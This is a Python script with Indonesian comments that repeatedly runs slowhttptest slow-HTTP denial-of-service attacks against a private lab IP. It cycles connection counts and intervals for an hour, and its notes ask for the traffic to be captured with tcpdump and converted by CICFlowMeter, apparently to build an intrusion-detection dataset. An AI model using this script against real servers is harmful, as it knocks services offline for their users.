## attack 1 jam dengan attack parameter seperti di bawah ini

#slowhttptest -c 100 -H -i 5 -r 20 -t GET -u http://192.168.100.122 -x 24 -p 10 -l 60
# ini contoh yang aku pakai selama ini, tapi bisa diubah sesuai kebutuhan aka lebih sederhana

# Attack      : 50 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Interval    : 10 (default)
# Follow-up   : -

# Attack      : 200
# Connections : 100
# Runtime     : 240 sec
# Interval    : 10
# Follow-up   : -

# Attack      : 300
# Connections : 100
# Runtime     : 240 sec
# Interval    : 10
# Follow-up   : -

# Attack      : 400
# Connections : 100
# Runtime     : 240 sec
# Interval    : 15
# Follow-up   : -

# Attack      : 500
# Connections : 100
# Runtime     : 240 sec
# Interval    : 10 / 15 / 17 / 20
# Follow-up   : -

# Attack      : 600
# Connections : 100
# Runtime     : 240 sec
# Interval    : 10 / 15 / 17 / 20
# Follow-up   : -

## saat attack ini jangan lupa trafficnya dicapture dengan tcpdump dan pcap taruh di /home/victim/project/data/pcap/. terserah yang mana duluan tcpdump atau attack command, yang penting capture seluruh trafficnya

## dari pcap itu langsung convert ke csv dengan cicflowmeter dan taruh di /home/victim/project/data/csv/ dengan nama file sesuai dengan nama pcapnya, misal pcapnya slowread.pcap maka csvnya jadi slowread.csv

import subprocess
import time
import sys

TARGET_URL = "http://192.168.100.122"

# Ambil durasi total dari argumen command-line, default 3600 detik (1 jam) jika tidak diberikan
if len(sys.argv) > 1:
    try:
        TOTAL_RUNTIME = int(sys.argv[1])
    except ValueError:
        print("Argumen durasi harus berupa angka (detik).")
        sys.exit(1)
else:
    TOTAL_RUNTIME = 3600

# List of attack configurations: (attack_name, total_connections, rate, interval_list)
attack_configs = [
    ("attack_50", 50, 50, [10]),
    ("attack_200", 100, 100, [10]),
    ("attack_300", 100, 100, [10]),
    ("attack_400", 100, 100, [15]),
    ("attack_500", 100, 100, [10, 15, 17, 20]),
    ("attack_600", 100, 100, [10, 15, 17, 20]),
]

# Runtime per attack (detik)
RUNTIME_PER_ATTACK = 240

def run_attack(attack_name, total_connections, rate, interval_list, runtime):
    for intv in interval_list:
        print(f"\n[INFO] Menjalankan attack: {attack_name}, total_connections: {total_connections}, rate: {rate}, runtime: {runtime}, interval: {intv}")
        attack_cmd = f"slowhttptest -c {total_connections} -H -i {intv} -r {rate} -t GET -u {TARGET_URL} -l {runtime}"
        print(f"[INFO] Menjalankan: {attack_cmd}")
        subprocess.run(attack_cmd, shell=True)

if __name__ == "__main__":
    start_time = time.time()
    while True:
        for attack_name, total_connections, rate, intervals in attack_configs:
            elapsed = time.time() - start_time
            if elapsed >= TOTAL_RUNTIME:
                print(f"\n[INFO] Waktu total {TOTAL_RUNTIME} detik sudah tercapai. Selesai.")
                sys.exit(0)
            run_attack(attack_name, total_connections, rate, intervals, RUNTIME_PER_ATTACK)